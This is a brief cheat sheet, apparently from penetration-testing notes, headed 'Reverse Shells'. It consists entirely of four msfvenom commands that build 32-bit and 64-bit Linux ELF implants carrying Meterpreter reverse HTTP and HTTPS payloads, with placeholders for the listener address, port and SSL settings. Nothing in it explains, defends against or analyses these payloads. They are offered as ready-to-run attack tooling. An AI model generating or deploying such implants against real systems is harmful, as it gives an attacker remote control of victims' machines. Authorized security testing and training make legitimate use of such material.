# Reverse Shells

1. **x86 (32-bit) Payloads**

```
$ msfvenom -p linux/x86/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o implant-x86

$ msfvenom -p linux/x86/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o implant-x86
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p linux/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o implant-x64

$ msfvenom -p linux/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o implant-x64
```